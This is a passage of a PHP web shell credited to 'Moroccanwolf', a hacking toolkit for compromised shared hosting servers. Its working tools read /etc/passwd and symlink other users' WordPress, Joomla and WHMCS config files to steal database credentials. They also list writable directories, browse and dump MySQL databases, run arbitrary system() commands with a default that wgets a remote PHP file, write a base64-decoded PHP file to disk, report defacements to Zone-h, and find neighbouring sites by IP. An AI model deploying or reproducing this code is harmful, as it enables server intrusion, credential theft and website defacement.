<span class=""><textarea name="domain" cols="43" rows="17"></textarea></span> </p>

<p><input type="submit" value="Send" />

</form>

<br><br />
</div>

</center></h3>';



}



function poster($url, $hacker, $hackmode,$reson, $site )

{



$k = curl_init();

curl_setopt($k, CURLOPT_URL, $url);

curl_setopt($k,CURLOPT_POST,true);

curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);

curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);

curl_setopt($k, CURLOPT_RETURNTRANSFER, true);



$kubra = curl_exec($k);

curl_close($k);

return $kubra;

}


echo "<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
}


elseif (isset($_GET['tools']) && $_GET['tools'] == "cnf"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a></h2>
';

echo "<br><center><h6>Config Grabber</h6>";?></center><br><center><?php if (empty($_POST['config'])) { ?><p><font face="Tahoma" color="#007700" size="2pt"></p><br><form method="POST"><textarea name="passwd" class='area' rows='15' cols='60'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><input name="config" class='inputzbut' size="100" value="GET Config" type="submit"><br></form></center><br><?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink is disabled :( </error>');}@mkdir('mwolfconfig', 0755);@chdir('mwolfconfig');
$htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];$passwd=explode("\n",$passwd);echo "<br><br><center><font color=#b0b000 size=2pt>Founding ...</center><br>";foreach($passwd as $pwd){$pawd=explode(":",$pwd);$user =$pawd[0];@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>[Grabbered] -></b> <a target="_blank" href="mwolfconfig">Open configs</a></font></b>';}

echo "<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
}

elseif (isset($_GET['tools']) && $_GET['tools'] == "wri"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a></h2>
';

echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#0076B1"><h6>Find Directory Writable/Readable</h6></span></center><br><br>'.$end; function read_dir($path) { global $count; if ($handle = opendir($path)) { while (false !== ($file = readdir($handle))) { $dr="$path$file/"; if (($file!='.') and ($file!='..') and is_dir($dr)) { if (is_readable($dr) and is_writeable($dr)) { echo "[RW] " . $dr . "<br>\n\r"; $count++; } read_dir($dr); }}}} $count=0; set_time_limit(0); @$passwd=fopen('/etc/passwd','r'); if (!$passwd) { echo "<br><center><font color='#ff0000' size='2pt' />[-] No Access to /etc/passwd\n\r</center>"; exit;} $path_to_public=array(); echo "<html><center><table style='margin: 0 auto;'><tr valign='top'><td align='left'><font color='#0076B1' size='2pt' />\n\r"; while(!feof($passwd)) { $str=fgets($passwd); $pos=strpos($str,":"); $username=substr($str,0,$pos); $dirz="/home/$username/public_html/"; if (($username!="")) { if (is_readable($dirz)) { array_push($path_to_public,$dirz); if (is_writeable($dirz)) { $count++; echo "<font color=white>[</font><font color=yellow>R</font><font color=#0076B1>W</font><font color=white>]</font> " . $dirz . "<br><br><br>\n\r";} else echo "<font color=white>[</font><font color=yellow>R</font><font color=white>]</font> " . $dirz . "<br>\n\r"; }}} echo "<br><br><font color=white size=2pt>[+]</font> <font color=#0076B1 size=2pt>Found </font><font color=yellow size=2pt>" . sizeof($path_to_public) . "</font> <font color=#0076B1 size=2pt>readable public_html directories.</font><br><br>\n\r\n\r"; if (sizeof($path_to_public) != '0') { foreach ($path_to_public as $path) { } echo "<font color=white size=2pt>[+]</font> <font color=#0076B1 size=2pt>Found</font><font color=yellow size=2pt> " . $count . " </font><font color=#0076B1 size=2pt>writable directories.</font>\n\r"; echo "</td></tr></table></center></html>";
}

echo "<br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
}

elseif (isset($_GET['tools']) && $_GET['tools'] == "con"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a></h2>
';

echo"<center>
<h6>Mysql Connect </h6>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr> 
<td><font face='Tahoma' color='#0076B1' size='2pt' />Type</td><td><font face='Tahoma' color='#0076B1' size='2pt' />Host</td><td><font face='Tahoma' color='#0076B1' size='2pt' />Login</td><td><font face='Tahoma' color='#0076B1' size='2pt' />Password</td><td><font face='Tahoma' color='#0076B1' size='2pt' />Database</td><td></td></font></tr><tr> 
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'> 
<center><td><select name='type'><option value='mysql' "; 
if(@$_POST['type']=='mysql')echo 'selected'; 
echo ">MySql</option><option value='pgsql' "; 
if(@$_POST['type']=='pgsql')echo 'selected'; 
echo ">PostgreSql</option></select></td> 
<td><input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td> 
<td><input type=text name=sql_login value='". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."'></td> 
<td><input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>"; 
$tmp = "<input type=text name=sql_base value=''>"; 
if(isset($_POST['sql_host'])){ 
if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { 
switch($_POST['charset']) { 
case "Windows-1251": $db->setCharset('cp1251'); break; 
case "UTF-8": $db->setCharset('utf8'); break; 
case "KOI8-R": $db->setCharset('koi8r'); break; 
case "KOI8-U": $db->setCharset('koi8u'); break; 
case "cp866": $db->setCharset('cp866'); break; 
} 
$db->listDbs(); 
echo "<select name=sql_base><option value=''></option>"; 
while($item = $db->fetch()) { 
list($key, $value) = each($item); 
echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>'; 
} 
echo '</select>'; 
} 
else echo $tmp; 
}else
echo $tmp; 
echo "</td> 
  
<td><input type=submit value='>>' onclick='fs(d.sf);'></td> 
<td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> <font face='Tahoma' color='#0076B1' size='2pt' />count the number of rows</td></center> <br>
</tr> 
</table> <br>
<script> 
s_db='".@addslashes($_POST['sql_base'])."'; 
function fs(f) { 
if(f.sql_base.value!=s_db) { f.onsubmit = function() {}; 
if(f.p1) f.p1.value=''; 
if(f.p2) f.p2.value=''; 
if(f.p3) f.p3.value=''; 
} 
} 
function st(t,l) { 
d.sf.p1.value = 'select'; 
d.sf.p2.value = t; 
if(l && d.sf.p3) d.sf.p3.value = l; 
d.sf.submit(); 
} 
function is() { 
for(i=0;i<d.sf.elements['tbl[]'].length;++i) 
d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked; 
} 
</script>"; 
if(isset($db) && $db->link){ 
echo "<br/><table width=100% cellpadding=2 cellspacing=0>"; 
if(!empty($_POST['sql_base'])){ 
$db->selectdb($_POST['sql_base']); 
echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>"; 
$tbls_res = $db->listTables(); 
while($item = $db->fetch($tbls_res)) { 
list($key, $value) = each($item); 
if(!empty($_POST['sql_count'])) 
$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.'')); 
$value = htmlspecialchars($value); 
echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>"; 
} 
echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>"; 
if(@$_POST['p1'] == 'select') { 
$_POST['p1'] = 'query'; 
$_POST['p3'] = $_POST['p3']?$_POST['p3']:1; 
$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']); 
$num = $db->fetch(); 
$pages = ceil($num['n'] / 30); 
echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">"; 
echo " of $pages"; 
if($_POST['p3'] > 1) 
echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>"; 
if($_POST['p3'] < $pages) 
echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>"; 
$_POST['p3']--; 
if($_POST['type']=='pgsql') 
$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30); 
else
$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30'; 
echo "<br><br>"; 
} 
if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) { 
$db->query(@$_POST['p2']); 
if($db->res !== false) { 
$title = false; 
echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">'; 
$line = 1; 
while($item = $db->fetch())  { 
if(!$title) { 
echo '<tr>'; 
foreach($item as $key => $value) 
echo '<th>'.$key.'</th>'; 
reset($item); 
$title=true; 
echo '</tr><tr>'; 
$line = 2; 
} 
echo '<tr class="l'.$line.'">'; 
$line = $line==1?2:1; 
foreach($item as $key => $value) { 
if($value == null) 
echo '<td><i>null</i></td>'; 
else
echo '<td>'.nl2br(htmlspecialchars($value)).'</td>'; 
} 
echo '</tr>'; 
} 
echo '</table>'; 
} else { 
echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>'; 
} 
} 
echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>"; 
if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) 
echo htmlspecialchars($_POST['p2']); 
echo "</textarea><br/><input type=submit value='Execute'>"; 
echo "</td></tr>"; 
} 
echo "</table></form></center><br/>"; 
if($_POST['type']=='mysql') { 
$db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'"); 
if($db->fetch()) 
echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>"; 
} 
if(@$_POST['p1'] == 'loadfile') { 
$file = $db->loadFile($_POST['p2']); 
echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>'; 
} 
} else { 
echo htmlspecialchars($db->error()); 
} 

echo "<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
}


elseif (isset($_GET['tools']) && $_GET['tools'] == "con1"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a></h2>
';


echo'
<h6>Mysql Connect  Download </h6>
<form method="POST">
<input type="text" name="command" value="wget http://www.moroccanwolf.com/SQL.txt -O con.php" size="43">
<input type="submit" name="done" value="Execute">
</form>
';

$cmd = $_POST['command'];
if ($_POST['done']){

@mkdir('mysql', 0755);
@chdir('mysql');

@system("$cmd");

echo "<h3>DOne /mysql/con.php</h3>";


}
echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
}

elseif (isset($_GET['tools']) && $_GET['tools'] == "rev"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a></h2>
';


echo "<center><h6>reverse ip lookup</h6></center><div id=result>";

$kkk = "PGhlYWQ+DQo8c3R5bGU+DQppbnB1dFt0eXBlPXN1Ym1pdF17IHBhZGRpbmc6IDNweDsgY29sb3I6ICMwMDc3MDsNCiAgZm9udC13ZWlnaHQ6IGJvbGQ7IA0KdGV4dC1hbGlnbjogY2VudGVyOyANCiB0ZXh0LXNoYWRvdzogMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjMpOw0KICBiYWNrZ3JvdW5kOiAjYWVhZWFlOyANCiBiYWNrZ3JvdW5kLWNsaXA6IHBhZGRpbmctYm94OyANCiBib3JkZXI6IDFweCBzb2xpZCAjMjg0NDczOyANCiBib3JkZXItYm90dG9tLWNvbG9yOiAjMjIzYjY2OyANCiBib3JkZXItcmFkaXVzOiA0cHg7ICANCmN1cnNvcjogcG9pbnRlcjsgIA0KYmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KIGJhY2tncm91bmQtaW1hZ2U6IC1tb3otbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7DQogIGJhY2tncm91bmQtaW1hZ2U6IC1vLWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyANCiBiYWNrZ3JvdW5kLWltYWdlOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgIGJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyB9IA0KDQppbnB1dFt0eXBlPXRleHRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NkIxOyB0ZXh0LXNoYWRvdzogIzAwNzZCMSAwcHggMHB4IDNweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzZCMTsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDc2QjE7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogIzAwNzZCMSAwcHggMHB4IDRweDt9IA0KDQogDQogICAgICANCg0KDQo8L3N0eWxlPg0KPC9oZWFkPg0KPD9waHANCmVjaG8gIjxjZW50ZXI+PC9jZW50ZXI+PGRpdiBpZD1yZXN1bHQ+IjsNCmVjaG8gIjxjZW50ZXI+PGJyPjxmb3JtPjxpbnB1dCB0eXBlPSd0ZXh0JyBzaXplPSc2MCcgdmFsdWU9J21vcm9jY2Fud29sZi5jb20nIG5hbWU9J3dvbGYnIC8+PGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0naXBsb29rZG9tJz4gJm5ic3A7PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J3NlYXJjaCc+PC9mb3JtPjwvY2VudGVyPiI7DQppZihpc3NldCgkX0dFVFsid29sZiJdKSkNCnsNCiRzaXRlID0gJF9HRVRbIndvbGYiXTsNCiRubiA9ICJodHRwOi8vZG9tYWlucy55b3VnZXRzaWduYWwuY29tL2RvbWFpbnMucGhwIjsNCg0KLy9DdXJsIEZ1bmN0aW9uDQokY2ggPSBjdXJsX2luaXQoJG5uKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsICAicmVtb3RlQWRkcmVzcz0kc2l0ZSZrZXQ9Iik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsNCiRyZXNwID0gY3VybF9leGVjKCRjaCk7DQokcmVzcCA9IHN0cl9yZXBsYWNlKCJbIiwiIiwgc3RyX3JlcGxhY2UoIl0iLCIiLCBzdHJfcmVwbGFjZSgiXCJcIiIsIiIsIHN0cl9yZXBsYWNlKCIsICwiLCIsIiwgc3RyX3JlcGxhY2UoInsiLCIiLCBzdHJfcmVwbGFjZSgieyIsIiIsIHN0cl9yZXBsYWNlKCJ9IiwiIiwgc3RyX3JlcGxhY2UoIiwgIiwiLCIsIHN0cl9yZXBsYWNlKCIsICIsIiwiLCAgc3RyX3JlcGxhY2UoIiciLCIiLCBzdHJfcmVwbGFjZSgiJyIsIiIsIHN0cl9yZXBsYWNlKCI6IiwiLCIsIHN0cl9yZXBsYWNlKCciJywnJywgJHJlc3AgKSApICkgKSApICkgKSApICkgKSkpKTsNCiRhcnJheSA9IGV4cGxvZGUoIiwsIiwgJHJlc3ApOw0KdW5zZXQoJGFycmF5WzBdKTsNCmVjaG8gIjx0YWJsZSBzdHlsZT0nbWFyZ2luOiAwIGF1dG8nPiI7DQpmb3JlYWNoKCRhcnJheSBhcyAkbG5rKQ0Kew0KICAgIHByaW50ICI8dHI+PHRkPjxhICBzdHlsZT1cImNvbG9yOiMwMDc2QjE7XCIgaHJlZj0nJGxuaycgdGFyZ2V0PV9ibGFuaz4kbG5rPC9hPjwvdGQ+PC90cj4iOw0KfQ0KZWNobyAiPC90YWJsZT4iOw0KY3VybF9jbG9zZSgkY2gpOw0KfQ0KDQo/Pg==";

$file = fopen("mwolf.php" ,"w+");
$write = fwrite ($file ,base64_decode($kkk));
fclose($file);
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900"></span><center><center><br><iframe src=mwolf.php width=75% height=70% frameborder=0></iframe></div></center>'; 
echo '<h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
}
elseif (isset($_GET['tools']) && $_GET['tools'] == "rjom"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a></h2>
';
echo '<center>  
<h6>Ip reverse Joomla</h6>
<form method="post" action="" enctype="multipart/form-data">  
<input type="text" name="ip" value="" placeholder="Extract From ip" size="15"> <input type=submit name=get value=&nbsp;&nbsp;Get&nbsp;&nbsp; />  
<br>  <br>
<textarea class="area"name="sites" cols="40" rows="13">';  
if(isset($_POST['get']) && $_POST['ip'] != ""){  
        $target = $_POST['ip'];  
        $sites = mbing("ip:$target index.php?option=com");  
        if(!empty($sites)){  
        $targets = implode("\n",cln_arr(array_map("jos_site",$sites)));  
        echo $targets;  
        }else{  
            echo "No Joomla Found.";  
        }  
}  
echo '</textarea></center>';  

function mbing($what){  
    for($i = 1; $i <= 2000; $i += 10){  
        $ch = curl_init();  
        curl_setopt ($ch, CURLOPT_URL, "http://www.bing.com/search?q=".str_replace(" ","+", $what)."&first=$i");  
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16");  
        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);      
        curl_setopt ($ch, CURLOPT_COOKIEFILE,getcwd().'/cookie.txt');  
        curl_setopt ($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');  
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);  
        $data = curl_exec($ch);  
        preg_match_all('#<h2 class="sb_h3 cttl"><a href="(https?://.*?)" _ctf="rdr_T"#',$data, $links);  
        foreach($links[1] as $link){  
            $allLinks[] = $link;  
        }  
        if(!preg_match('#class="sb_pagN"#',$data)) break;  
    }  
      
    if(!empty($allLinks) && is_array($allLinks)){  
        return array_unique($allLinks);  
    }  
}  

function cln_arr($array){  
    return @array_filter(@array_unique($array));  
}  
function jos_site($site){  
    return (preg_match("/option/",$site)) ? preg_replace("#(.*?)/index(.*)|(.*?)/?option(.*)#","$1/",$site):false;  
}

echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
}

elseif (isset($_GET['tools']) && $_GET['tools'] == "rwp"){
echo '
<h2>
<a href="?tools=cmd">Command Execution</a>-
<a href="?tools=whm">whmcs Killer</a>-
<a href="?tools=cnf">GET Config </a>-
<a href="?tools=znh">Zone-h Notifier</a>-
<a href="?tools=wri">Locate [W/R] Dir</a>-
<a href="?tools=con">Mysql Connect (mysql Cmd)</a>-
<a href="?tools=con1">Mysql Connect (normal)</a>-
<a href="?tools=rev">reverse ip lookup</a>-
<a href="?tools=rjom">Ip reverse Joomla</a>-
<a href="?tools=rwp">Ip reverse wordpress</a></h2>
';
echo '<center>
<h6>Ip reverse wordpress</h6>
<form method="post" action="" enctype="multipart/form-data">  
<input type="text" name="ip" value="" placeholder="Extract From ip" size="15"> <input type=submit name=get value=&nbsp;&nbsp;Get&nbsp;&nbsp; /><br>  
<br />  
<textarea class="area" name="sites" cols="40" rows="13">';  
if(isset($_POST['get']) && $_POST['ip'] != ""){  
        $target = $_POST['ip'];  
        $dorks = array('/?page_id=', '/wp-content/');          
        foreach($dorks as $dork){  
            $sites = mbing("ip:$target $dork");  
            if(!empty($sites)){  
                $targets = implode("\n",cln_arr(array_map("wp_site",$sites)));  
                echo $targets."\n";  
            }  
        }  
          
}  
echo '</textarea></center>';  

function mbing($what){  
    for($i = 1; $i <= 2000; $i += 10){  
        $ch = curl_init();  
        curl_setopt ($ch, CURLOPT_URL, "http://www.bing.com/search?q=".str_replace(" ","+", $what)."&first=$i");  
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16");  
        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);      
        curl_setopt ($ch, CURLOPT_COOKIEFILE,getcwd().'/cookie.txt');  
        curl_setopt ($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');  
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);  
        $data = curl_exec($ch);  
        preg_match_all('#<h2 class="sb_h3 cttl"><a href="(https?://.*?)" _ctf="rdr_T"#',$data, $links);  
        foreach($links[1] as $link){  
            $allLinks[] = $link;  
        }  
        if(!preg_match('#class="sb_pagN"#',$data)) break;  
    }  
      
    if(!empty($allLinks) && is_array($allLinks)){  
        return array_unique($allLinks);  
